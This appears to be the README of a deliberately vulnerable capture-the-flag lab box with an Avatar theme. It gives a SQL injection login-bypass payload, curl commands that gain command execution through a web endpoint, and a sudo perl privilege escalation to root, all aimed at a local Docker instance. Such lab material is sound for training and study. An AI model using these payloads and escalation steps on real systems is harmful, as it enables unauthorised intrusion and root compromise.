# Hill 14 - Avatar Link Unit (Avatar) (SQLi auth bypass -> console RCE -> sudo perl)

*Theme: Avatar / RDA.* The biometric "link" login builds its SQL query by string
formatting, so the login is a **SQL injection auth bypass**.

- **Entry:** `POST /login` with `name`/`pass`. Inject to satisfy the query without
  credentials (e.g. `name=' OR 1=1 -- `) -> a `sess` cookie. A linked operator drives
  the unit at `GET /run?cmd=...` -> shell. Foothold: `navi`. Port 80 (8094 locally).
- **Privesc:** sudoers lets `navi` run `/usr/bin/perl` as root (GTFOBins):
  `sudo perl -e 'system("cat /root/root.txt")'`. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. SQLi auth bypass -> grab the session cookie
    C=$(curl -s -i -X POST --data-urlencode "name=' OR 1=1 -- " --data-urlencode 'pass=x' \
        http://127.0.0.1:8094/login | grep -i set-cookie | sed 's/.*sess=//; s/;.*//' | tr -d '\r')

    # 2. console RCE -> user flag
    curl -s -b "sess=$C" -G http://127.0.0.1:8094/run --data-urlencode 'cmd=cat /home/navi/user.txt'

    # 3. privesc via sudo perl -> root flag
    curl -s -b "sess=$C" -G http://127.0.0.1:8094/run --data-urlencode \
      "cmd=sudo perl -e 'system(\"cat /root/root.txt\")'"

    # 4. take the hill: write your team token to /root/king.txt as root
    curl -s -b "sess=$C" -G http://127.0.0.1:8094/run --data-urlencode \
      "cmd=sudo perl -e 'system(\"echo TOK-YOUR-TEAM > /root/king.txt\")'"

## Run locally

    docker compose up -d --build   # app: http://localhost:8094/

## Reset behaviour

`reset.sh` restores the `sudo perl` sudoers entry and keeps the server alive. It does
**not** touch `king.txt`.
